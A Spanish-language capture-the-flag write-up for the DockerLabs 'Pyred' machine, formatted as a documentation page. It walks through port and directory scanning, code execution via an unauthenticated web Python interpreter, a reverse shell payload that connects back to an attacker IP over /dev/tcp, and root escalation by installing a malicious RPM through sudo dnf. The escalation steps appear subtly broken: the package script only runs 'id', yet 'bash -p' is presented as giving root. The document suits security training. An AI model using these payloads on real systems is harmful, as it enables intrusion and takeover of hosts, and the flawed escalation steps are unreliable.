@@ -1,0 +1,179 @@
+---
+title: Pyred
+description: Resolución completa de la máquina virtual *Pyred* de DockerLabs, incluyendo reconocimiento, explotación y escalada de privilegios.
+---
+
+import InfoTable from 'src/components/InfoTable.astro';
+import VulnTable from 'src/components/VulnTable.astro';
+
+## Introducción
+
+Este documento presenta la resolución completa de la máquina **Pyred**, desarrollada por *El Pingüino de Mario* para la plataforma **DockerLabs**, clasificada con una dificultad **Media**.
+El laboratorio expone un intérprete de Python accesible desde el navegador sin autenticación ni validación, permitiendo la ejecución arbitraria de código y la obtención de una reverse shell como un usuario no privilegiado.
+Una vez dentro, se identifica una configuración insegura de `sudo` que permite ejecutar `dnf` como root. Mediante la creación de un paquete RPM malicioso, se instala con privilegios elevados y se obtiene acceso completo como `root`.
+Todo el proceso se llevó a cabo dentro de un entorno controlado con fines estrictamente educativos.
+
+---
+
+## Información Técnica
+
+<InfoTable
+  title=""
+  data={{
+    Nombre: 'Pyred',
+    Autor: 'El Pingüino de Mario',
+    Dificultad: 'Media',
+    Fecha: '26/06/2024',
+    Plataforma: 'DockerLabs',
+    'IP Objetivo': '172.17.0.2'
+  }}
+/>
+
+---
+
+## Paso 0 — Despliegue y preparación
+
+Se descomprime la máquina y se despliega utilizando el script proporcionado:
+
+```bash
+unzip Pyred.zip
+sudo bash auto_deploy.sh Pyred.tar
+```
+
+Una vez iniciado el contenedor, se asigna la dirección IP correspondiente.
+
+![IP asignada](https://res.cloudinary.com/dewqswzke/image/upload/v1762582724/Ip_qrhpof.png)
+
+Se organiza el entorno de trabajo para mantener una estructura clara durante el análisis:
+
+```bash
+mkdir -p Pyred/{content,exploits,nmap,scripts}
+cd Pyred
+```
+
+---
+
+## Paso 1 — Reconocimiento
+
+### 1.1 Escaneo de puertos
+
+Se realiza un escaneo completo de puertos TCP para identificar servicios expuestos:
+
+```bash
+nmap -p- --open -sS --min-rate 5000 -vvv -n 172.17.0.2 -oG allPorts
+extractPorts allPorts
+```
+
+El resultado muestra los siguientes servicios accesibles externamente:
+
+* **5000/tcp** — HTTP
+
+![Puertos abiertos](https://res.cloudinary.com/dewqswzke/image/upload/v1770260939/Ports_jhkymk.png)
+
+---
+
+### 1.2 Enumeración de servicios
+
+Se realiza un escaneo detallado de los servicios identificados:
+
+```bash
+nmap -sCV -p5000 172.17.0.2
+```
+
+---
+
+### 1.3 Enumeración web
+
+Se realiza un escaneo de directorios:
+
+```bash
+feroxbuster -u http://172.17.0.2:5000 \
+  -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-big.txt \
+  -x php,html,txt,js -t 100 -C 404
+```
+
+La página principal expone un intérprete de Python en línea sin autenticación:
+
+![Index](https://res.cloudinary.com/dewqswzke/image/upload/v1770260939/Index_pmgt1u.png)
+
+---
+
+## Paso 2 — Explotación (Acceso inicial)
+
+### 2.1 Ejecución remota de comandos
+
+Se verifica la ejecución de código:
+
+```python
+print("test")
+```
+
+### 2.2 Reverse shell
+
+Se inicia un listener:
+
+```bash
+nc -nlvp 443
+```
+
+Se ejecuta el payload:
+
+```python
+import os;
+os.system("bash -c 'exec bash -i &>/dev/tcp/172.17.0.1/443 <&1'")
+```
+
+![Reverse shell](https://res.cloudinary.com/dewqswzke/image/upload/v1770260940/ReverseShell_knmqet.png)
+
+---
+
+## Paso 3 — Escalada de privilegios
+
+### 3.1 De usuario → root
+
+Se verifican los permisos sudo:
+
+```bash
+sudo -l
+```
+
+![Sudo -l](https://res.cloudinary.com/dewqswzke/image/upload/v1770260941/Sudo-l_uhseyr.png)
+
+Se puede ejecutar `dnf` como root. Se crea un paquete RPM malicioso en la máquina atacante:
+
+```bash
+TF=$(mktemp -d)
+echo 'id' > $TF/x.sh
+fpm -n x -s dir -t rpm -a all --before-install $TF/x.sh $TF
+```
+
+Se transfiere el archivo a la máquina víctima y se instala:
+
+```bash
+sudo dnf install -y x-1.0-1.noarch.rpm
+bash -p
+```
+
+![Root](https://res.cloudinary.com/dewqswzke/image/upload/v1770260940/Root_n00dly.png)
+
+---
+
+## Análisis de Vulnerabilidades
+
+### Fallos de Seguridad Identificados
+
+<VulnTable
+  title=""
+  data={[
+    {
+      vulnerability: "Intérprete de Python expuesto sin restricciones",
+      severity: "Crítica",
+      impact: "Ejecución remota de comandos"
+    },
+    {
+      vulnerability: "Configuración insegura de sudo en dnf",
+      severity: "Crítica",
+      impact: "Escalada directa de privilegios a root"
+    }
+  ]}
+/>
